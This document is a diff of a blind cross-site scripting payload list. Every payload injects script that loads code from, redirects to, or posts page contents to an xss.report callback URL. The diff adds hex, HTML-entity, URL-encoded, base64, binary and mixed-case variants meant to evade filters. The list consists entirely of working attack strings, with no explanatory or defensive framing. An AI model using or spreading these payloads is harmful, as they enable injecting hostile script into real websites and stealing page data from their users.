@@ -1,22 +1,45 @@
-'"><script src=https://xss.report/c/habib?1></script>
+
+
+27223e3c736372697074207372633d68747470733a2f2f7873732e7265706f72742f632f68616269623e3c2f7363726970743e
+&apos;&quot;&gt;&lt;script src=https://xss.report/c/habib&gt;&lt;/script&gt;
+%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fhabib%3E%3C%2Fscript%3E
+JyI+PHNjcmlwdCBzcmM9aHR0cHM6Ly94c3MucmVwb3J0L2MvaGFiaWI+PC9zY3JpcHQ+
+'"><sCrIpT sRc=hTtPs://xSs.rEpOrT/C/HaBiB></ScRiPt>
+3c7363726970743e242e67657453637269707428222f2f7873732e7265706f72742f632f68616269623f3722293c2f7363726970743e
+&lt;script&gt;$.getScript(&quot;//xss.report/c/habib?7&quot;)&lt;/script&gt;
+%3Cscript%3E%24.getScript%28%22%2F%2Fxss.report%2Fc%2Fhabib%3F7%22%29%3C%2Fscript%3E
+PHNjcmlwdD4kLmdldFNjcmlwdCgiLy94c3MucmVwb3J0L2MvaGFiaWI/NyIpPC9zY3JpcHQ+
+<ScRiPt>$.gEtScRiPt("//XsS.RePoRt/c/hAbIb?7")</ScRiPt>
+27223c696d67207372633d78206f6e6572726f723d27746869732e7372633d2268747470733a2f2f7873732e7265706f72742f632f68616269623f313122273e
+&apos;&quot;&lt;img src=x onerror=&apos;this.src=&quot;https://xss.report/c/habib?11&quot;&apos;&gt;
+%27%22%3Cimg%20src%3Dx%20onerror%3D%27this.src%3D%22https%3A%2F%2Fxss.report%2Fc%2Fhabib%3F11%22%27%3E
+JyI8aW1nIHNyYz14IG9uZXJyb3I9J3RoaXMuc3JjPSJodHRwczovL3hzcy5yZXBvcnQvYy9oYWJpYj8xMSInPg==
+'"<ImG sRc=x OnErRoR='tHiS.SrC="hTtPs://xSs.rEpOrT/C/HaBiB?11"'>
+00100111001000100011110001001001011011010100011100100000011100110101001001100011001111010111100000100000010011110110111001000101011100100101001001101111010100100011110100100111011101000100100001101001010100110010111001010011011100100100001100111101001000100110100001010100011101000101000001110011001110100010111100101111011110000101001101110011001011100111001001000101011100000100111101110010010101000010111101000011001011110100100001100001010000100110100101000010001111110011000100110001001000100010011100111110
+27223c736372697074206e6f6d6f64756c65207372633d2268747470733a2f2f7873732e7265706f72742f632f68616269623f3230223e3c2f7363726970743e
+&apos;&quot;&lt;script nomodule src=&quot;https://xss.report/c/habib?20&quot;&gt;&lt;/script&gt;
+JyI8c2NyaXB0IG5vbW9kdWxlIHNyYz0iaHR0cHM6Ly94c3MucmVwb3J0L2MvaGFiaWI/MjAiPjwvc2NyaXB0Pg==
+'"<ScRiPt NoMoDuLe SrC="hTtPs://xSs.rEpOrT/C/HaBiB?20"></ScRiPt>
+00100111001000100011110001110011011000110111001001101001011100000111010000100000011011100110111101101101011011110110010001110101011011000110010100100000011100110111001001100011001111010010001001101000011101000111010001110000011100110011101000101111001011110111100001110011011100110010111001110010011001010111000001101111011100100111010000101111011000110010111101101000011000010110001001101001011000100011111100110010001100000010001000111110001111000010111101110011011000110111001001101001011100000111010000111110
+001001110010001000111100011100110110001101110010011010010111000001110100001000000111010001111001011100000110010100111101001000100111010001100101011110000111010000101111011010100110000101110110011000010111001101100011011100100110100101110000011101000010001000100000011100110111001001100011001111010010001001101000011101000111010001110000011100110011101000101111001011110111100001110011011100110010111001110010011001010111000001101111011100100111010000101111011000110010111101101000011000010110001001101001011000100011111100110001001110000010001000111110001111000010111101110011011000110111001001101001011100000111010000111110
+27223c73637269707420747970653d22746578742f6a61766173637269707422207372633d2268747470733a2f2f7873732e7265706f72742f632f68616269623f3138223e3c2f7363726970743e
+&apos;&quot;&lt;script type=&quot;text/javascript&quot; src=&quot;https://xss.report/c/habib?18&quot;&gt;&lt;/script&gt;
+JyI8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL3hzcy5yZXBvcnQvYy9oYWJpYj8xOCI+PC9zY3JpcHQ+
+'"<ScRiPt TyPe="TeXt/jAvAsCrIpT" SrC="hTtPs://xSs.rEpOrT/C/HaBiB?18"></ScRiPt>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/habib?3\';document.body.appendChild(a)')
 var a=document.createElement("script");a.src="https://xss.report/c/habib?4";document.body.appendChild(a);
 "><iframe srcdoc="<script>var a=parent.document.createElement("script");a.src="https://xss.report/c/habib?5";parent.document.body.appendChild(a);</script>">
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/habib?6");a.send();</script>
-<script>$.getScript("//xss.report/c/habib?7")</script>
 var a=document.createElement("script");a.src="https://xss.report/c/habib?8";document.body.appendChild(a);
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\habib?9/.source))//>
 '"<img src="https://xss.report/c/habib?10" onerror='this.src="https://xss.report/c/habib?10"'>
-'"<img src=x onerror='this.src="https://xss.report/c/habib?11"'>
 '"<img src=x onerror='fetch("https://xss.report/c/habib?12",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
 '"<iframe src='javascript:window.location="https://xss.report/c/habib?13"'></iframe>
 '"<iframe srcdoc='<script>window.location="https://xss.report/c/habib?14"</script>'></iframe>
 '"<iframe srcdoc='<script>fetch("https://xss.report/c/habib?15",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
 '"<object data='javascript:window.location="https://xss.report/c/habib?16"'></object>
 <input onfocus='fetch("https://xss.report/c/habib?17",{method:"POST",mode:"no-cors"})' autofocus>
-'"<script type="text/javascript" src="https://xss.report/c/habib?18"></script>
 '"<script type="module" src="https://xss.report/c/habib?19"></script>
-'"<script nomodule src="https://xss.report/c/habib?20"></script>
 javascript:window.location="https://xss.report/c/habib?21"
 javascript:fetch("https://xss.report/c/habib?22")
 --></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss.report/c/habib?23"></scrIpt>
